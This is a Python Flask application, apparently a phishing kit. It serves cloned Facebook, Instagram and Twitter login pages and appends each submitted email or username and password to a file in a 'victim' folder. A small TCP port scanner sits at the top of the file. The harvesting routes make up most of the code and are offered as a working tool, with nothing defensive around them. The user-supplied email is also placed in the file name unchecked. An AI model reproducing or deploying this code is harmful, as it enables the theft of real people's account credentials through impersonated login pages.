from flask import Flask,request,render_template,flash,redirect
import socket

def scan_port(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
        print(f"Port {port} is open on {host}")
    except ConnectionRefusedError:
        print(f"Port {port} is closed on {host}")
    finally:
        s.close()

if __name__ == "__main__":
    host = "0.0.0.0"  # Replace with the desired IP address
    ports = [22, 80, 443]  # List of ports to scan

    for port in ports:
        scan_port(host, port)


app=Flask(__name__)

app.secret_key ='hyahya'
@app.route("/")
def main():
    return render_template("index.html")

@app.route("/facebook")
def facebook():
    return render_template("facebook.html")

@app.route("/facebook-login",methods=['GET','POST'])
def startt():
        email = request.form.get('email')
        password = request.form.get('pass')
        with open(f"victim/facebook/{email}.txt","+a") as file:
            file.writelines(f"\nEmail : {email}\npassword :  {password}")
            
        return render_template('facebook-loading.html')


@app.route("/instagram")
def instagram():
    return render_template("instagram.html")

@app.route("/instagram-login",methods=['GET','POST'])
def startt2():
        email2 = request.form.get('username')
        password2 = request.form.get('password')
        with open(f"victim/instagram/{email2}.txt","+a") as file:
            file.writelines(f"\nEmail : {email2}\npassword :  {password2}")
            
        return render_template('instagram-loading.html')

@app.route("/twitter")
def twitter():
    return render_template("twitter.html")

@app.route("/twitter-login",methods=['GET','POST'])
def startt3():
        email3 = request.form.get('username')
        password3 = request.form.get('password')
        with open(f"victim/twitter/{email3}.txt","+a") as file:
            file.writelines(f"\nEmail : {email3}\npassword :  {password3}")
            
        return render_template('twitter-loading.html')

app.run(debug=True)
